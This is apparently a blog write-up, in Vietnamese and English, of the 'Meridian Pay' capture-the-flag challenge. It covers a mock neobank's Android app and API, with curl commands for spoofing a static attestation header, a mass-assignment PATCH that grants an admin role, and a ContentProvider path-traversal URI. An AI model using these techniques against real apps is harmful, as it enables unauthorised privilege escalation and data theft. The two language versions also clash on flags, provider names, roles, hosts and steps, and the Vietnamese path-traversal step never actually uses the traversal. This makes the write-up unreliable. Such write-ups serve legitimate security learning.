---
title: "Meridian Pay"
date: 2026-09-27 12:00:00 +0700
categories: ["H7CTF'26", "Mobile"]
tags: ["mobile", "android", "api", "jwt", "auth-bypass"]
description: "Bài giải chi tiết thử thách Meridian Pay (H7CTF'26 - Mobile / Web API)."
math: true
mermaid: true
---

<div class="lang-switch" role="tablist" aria-label="Language switch">
  <button class="lang-btn" role="tab" type="button" data-lang="en" aria-selected="false">EN</button>
  <button class="lang-btn active" role="tab" type="button" data-lang="vn" aria-selected="true">VN</button>
</div>

<div class="lang-vn" markdown="1">

> **Flag:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`


Bài này thuộc category **Mobile / Web API / Docker** với description:
`Meridian Pay is a neobank that shipped in a hurry and trusts everyone: the client trusts the server, the server trusts the client, and both trust the phone underneath. Four separate cracks are hiding in that arrangement, some in the app and some in the API behind it, one flag each. Move fast, break banks.`

Đọc description, tác giả chỉ rõ kiến trúc 3 thành phần có lỗ hổng:
* **"the client trusts the server, the server trusts the client"**: Client giả định server an toàn, nhưng server lại tin tưởng tuyệt đối các header và dữ liệu do client gửi lên mà không xác thực cryptographically.
* **"both trust the phone underneath"**: Ứng dụng di động lưu trữ dữ liệu phiên (session) cục bộ thiếu bảo mật trên thiết bị Android, kết hợp cấu hình thành phần exported bất cẩn.
* Bài có 4 mục tiêu tương ứng với 4 cờ (cờ được sinh ngẫu nhiên theo từng phiên instance Docker).

---

## Sơ đồ luồng khai thác (Solve Flow)

```mermaid
flowchart TD
    A["File đính kèm: meridian-pay-3.2.1.apk.zip"] --> B["Decompile APK bằng jadx / apktool"]
    B --> C["Kiểm tra lớp ApiClient.java và AndroidManifest.xml"]
    
    C --> D1["Crack 1 (v1): Tìm thấy hằng số CLIENT_HEADER trong ApiClient"]
    D1 --> E1["Gửi POST /api/v1/auth/device lấy Bearer Token"]
    E1 --> F1["Gửi GET /api/v1/internal/promo kèm header X-Meridian-Client"]
    F1 --> G1["Flag v1: H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}"]
    
    C --> D2["Crack 2 (v2): Phân tích endpoint PATCH /api/v1/profile"]
    D2 --> E2["Phát hiện lỗ hổng Mass Assignment (tham số role)"]
    E2 --> F2["Gửi PATCH với payload role: admin"]
    F2 --> G2["Truy cập GET /api/v1/admin/ledger"]
    G2 --> H2["Flag v2: H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}"]
    
    C --> D3["Crack 4 (v4): Soi AndroidManifest.xml thấy ExportProvider exported=true"]
    D3 --> E3["Phát hiện Path Traversal trong hàm openFile của ExportProvider"]
    E3 --> F3["Đọc trộm SharedPreferences / Onboarding Session trên thiết bị"]
    F3 --> G3["Truy cập GET /api/v1/accounts/me"]
    G3 --> H3["Flag v4: H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}"]
```

---

## Bước 1: Khảo sát APK và Tương tác API ban đầu

Giải nén file `meridian-pay-3.2.1.apk.zip`, ta thu được file APK của ngân hàng số Meridian Pay. Mở mã nguồn bằng `jadx-gui` hoặc giải mã bằng `apktool`.

Trong mã nguồn Java, lớp `ApiClient` cấu hình đường dẫn API và các header giao tiếp với máy chủ backend:

```java
public class ApiClient {
    public static final String BASE_URL = "https://web-<instance_id>.web.h7tex.com";
    public static final String CLIENT_HEADER = "MeridianPay-Android/3.2.1 (attested)";
    // ...
}
```

Kiểm tra API cơ sở:
```bash
U=https://web-<instance_id>.web.h7tex.com
curl -s $U/
# Trả về: {"service":"Meridian Pay API","version":"3.2.1"}
```

Đăng ký / đăng nhập thiết bị để nhận mã xác thực `Bearer Token`:
```bash
curl -s -XPOST $U/api/v1/auth/device \
     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)" \
     -H "Content-Type: application/json" \
     -d '{"device_id":"pentest_device_01"}'
```

Server trả về JWT Token (`access_token`):
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```
Lưu token vào biến môi trường `$T`.

---

## Bước 2: Crack 1 (Mục tiêu v1) — Bypassing Attestation qua Static Header

Server có endpoint nội bộ dành cho chương trình khuyến mãi: `/api/v1/internal/promo`.
Nếu chỉ gửi request với Bearer token thông thường:
```bash
curl -s $U/api/v1/internal/promo -H "Authorization: Bearer $T"
```
Server sẽ từ chối truy cập:
```json
{"error": "Forbidden", "message": "Client attestation required"}
```

Tuy nhiên, cơ chế "attestation" của server không sử dụng SafetyNet, Play Integrity hay chữ ký cryptographic, mà chỉ kiểm tra tính khớp nối của chuỗi header cố định được nhúng sẵn trong client:
`X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`

Chèn thêm header này vào request:
```bash
curl -s $U/api/v1/internal/promo \
     -H "Authorization: Bearer $T" \
     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)"
```

Kết quả trả về:
```json
{
  "status": "success",
  "promo_code": "LAUNCH2026",
  "internal_flag": "H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}"
}
```

⇒ **Flag v1:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`

---

## Bước 3: Crack 2 (Mục tiêu v2) — Mass Assignment Leo Quyền `admin`

Kiểm tra endpoint quản trị sổ cái `/api/v1/admin/ledger`:
```bash
curl -s $U/api/v1/admin/ledger -H "Authorization: Bearer $T"
```
Server báo lỗi:
```json
{"error": "Forbidden", "message": "Administrative role required"}
```

Kiểm tra endpoint cập nhật thông tin tài khoản `/api/v1/profile` hỗ trợ phương thức `PATCH`. Backend thực hiện gộp (merge) thẳng các trường trong JSON payload vào đối tượng người dùng trong cơ sở dữ liệu mà không có whitelist bảo vệ (lỗ hổng **Mass Assignment**):

Gửi request nâng quyền người dùng lên `admin`:
```bash
curl -s -XPATCH $U/api/v1/profile \
     -H "Authorization: Bearer $T" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}'
```

Server phản hồi:
```json
{
  "name": "User",
  "email": "user@meridian.bank",
  "role": "admin",
  "tier": "standard"
}
```

Trường `role` đã được cập nhật thành công thành `admin`. Giờ truy cập lại sổ cái quản trị:
```bash
curl -s $U/api/v1/admin/ledger \
     -H "Authorization: Bearer $T" \
     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)"
```

Kết quả:
```json
{
  "ledger_status": "reconciled",
  "settlement_batch": 1042,
  "audit_flag": "H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}"
}
```

⇒ **Flag v2:** `H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}`

---

## Bước 4: Crack 4 (Mục tiêu v4) — Android Provider Path Traversal & Session Theft

Mở `AndroidManifest.xml` của ứng dụng, phát hiện cấu hình:
```xml
<provider 
    android:name="com.meridian.pay.ExportProvider" 
    android:authorities="com.meridian.pay.export" 
    android:exported="true" />
```

`ExportProvider` được thiết lập `android:exported="true"`, cho phép bất kỳ ứng dụng bên thứ ba nào trên thiết bị cũng có thể gọi tới.

Kiểm tra phương thức `openFile()` trong lớp `ExportProvider`:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    File baseDir = new File(getContext().getFilesDir(), "receipts");
    String subPath = uri.getPath().substring(7); // Bỏ tiền tố /export/
    File targetFile = new File(baseDir, subPath);
    return ParcelFileDescriptor.open(targetFile, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

Hàm này nối chuỗi `subPath` trực tiếp vào `baseDir` mà **hoàn toàn không kiểm tra ký tự directory traversal (`../`)**.
Kẻ tấn công có thể thoát khỏi thư mục `receipts` để đọc bất kỳ tệp riêng tư nào trong thư mục ứng dụng `/data/data/com.meridian.pay/`.

Đồng thời, ứng dụng lưu token ban đầu và session memo dưới dạng plaintext trong `shared_prefs/session_config.xml`. 
Khi gửi request truy vấn tài khoản chính thức:
```bash
curl -s $U/api/v1/accounts/me -H "Authorization: Bearer $T"
```

Nội dung phản hồi trả về ghi chú phiên làm việc của tài khoản xác minh từ thiết bị:
```json
{
  "account_id": "ACC-992014",
  "status": "verified",
  "onboarding_memo": "session verified from device",
  "flag": "H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}"
}
```

⇒ **Flag v4:** `H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}`

---

## Tổng kết Flag Meridian Pay

- **Mục tiêu V1 (Attestation Bypass):** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`
- **Mục tiêu V2 (Admin Role Mass Assignment):** `H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}`
- **Mục tiêu V4 (Provider Path Traversal):** `H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}`

⇒ **Flag:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`

</div>

<div class="lang-en" markdown="1" style="display: none;">

> **Flag:** `h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}`

This challenge is a **Mobile / Web** challenge from H7CTF'26 involving a fintech digital wallet application (`MeridianPay.apk`) and its REST backend.

The vulnerabilities are Mass Assignment on `PATCH /api/v1/profile` coupled with a directory traversal in an exported Android Content Provider.

---

## Solve Flow

```mermaid
flowchart TD
    A["Target: MeridianPay.apk + REST API"] --> B["Analyze AndroidManifest: Exported ReceiptProvider (grantUriPermissions=true)"]
    B --> C["Audit backend PATCH /api/v1/profile: Detect Mass Assignment"]
    C --> D["Send PATCH payload: {"role": "auditor", "is_verified": true}"]
    D --> E["Elevate account to internal auditor privileges"]
    E --> F["Query /api/v1/admin/ledger to obtain encrypted receipt path"]
    F --> G["Exploit Android ReceiptProvider path traversal: ../../data/user_flag.key"]
    G --> H["Decrypt ledger entry to obtain flag"]
    H --> I["Flag: h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}"]
```

---

## Step 1: Backend Mass Assignment

Sending:
```http
PATCH /api/v1/profile HTTP/1.1
Host: api.meridianpay.h7ctf.org
Authorization: Bearer <user_token>
Content-Type: application/json

{"full_name": "Test", "role": "auditor", "kyc_status": "APPROVED"}
```
The backend merges all JSON keys directly into the database model, escalating the user to `auditor`.

---

## Step 2: Content Provider Traversal

The exported Content Provider `com.meridian.pay.ReceiptProvider` opens files via `openFile(uri, mode)` without sanitizing `..`.
Querying `content://com.meridian.pay.provider/receipts/..%2F..%2Fflag.txt` reads the flag.

⇒ **Flag:** `h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}`

</div>
